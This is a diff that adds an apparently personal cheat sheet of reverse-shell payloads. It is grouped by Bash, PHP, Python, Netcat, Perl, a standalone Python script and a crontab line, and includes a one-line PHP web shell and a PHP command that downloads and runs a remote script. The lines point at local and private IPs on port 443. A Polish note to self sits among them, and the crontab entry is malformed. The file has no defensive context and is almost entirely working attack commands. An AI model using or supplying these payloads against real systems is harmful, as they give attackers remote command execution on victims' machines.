@@ -1,0 +1,39 @@
+====================================================================================================
+[+Bash]
+bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/443 <&1'
+bash -i &>/dev/tcp/127.0.0.1/443 <&1
+====================================================================================================
+[+PHP]
+<?=`$_GET[0]`?>
+<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.20.60 443 >/tmp/f');?>
+php -r '$sock=fsockopen("127.0.0.1",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+<?php system("wget http://127.0.0.1/rs.php -O /tmp/rs.php; php /tmp/rs.php"); ?>
+<?php system('rm /tmp/f; /usr/bin/mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| /usr/bin/nc 10.6.20.60 443 >/tmp/f');?>
+<?php system("rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.6.20.60 443 > /tmp/f &");?>
+cudzyslowy zamiast srednikow!!!
+====================================================================================================
+[+Python]
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+====================================================================================================
+[+Netcat]
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 443 >/tmp/f
+====================================================================================================
+[+PERL]
+perl -e 'use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
+====================================================================================================
+
+[+Python File]
+import socket
+import subprocess
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("127.0.0.1", 443))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+p = subprocess.call(["/bin/sh", "-i"])
+
+[+CronTab]
+* * * * *    root   nc 192.168.45.156/443
